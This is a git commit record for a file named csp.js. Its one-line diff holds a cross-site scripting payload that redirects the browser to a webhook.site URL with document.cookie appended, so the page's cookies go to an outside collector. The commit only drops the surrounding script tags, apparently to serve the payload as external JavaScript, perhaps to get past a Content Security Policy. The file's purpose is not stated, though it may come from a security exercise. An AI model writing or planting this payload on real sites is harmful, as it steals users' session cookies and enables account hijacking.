8b606714e13adffd3d6a59bc3526bc2e175afa5f
X-n3t <52056830+X-n3t@users.noreply.github.com>
2023-02-04 17:31:14 +0100

    Update csp.js

--- csp.js
+++ csp.js
@@ -1,1 +1,1 @@
-<script>document.location="https://webhook.site/adf9515b-b130-47a6-9ec1-c3a61e18d592?cookie=" + document.cookie</script>
+document.location="https://webhook.site/adf9515b-b130-47a6-9ec1-c3a61e18d592?cookie=" + document.cookie
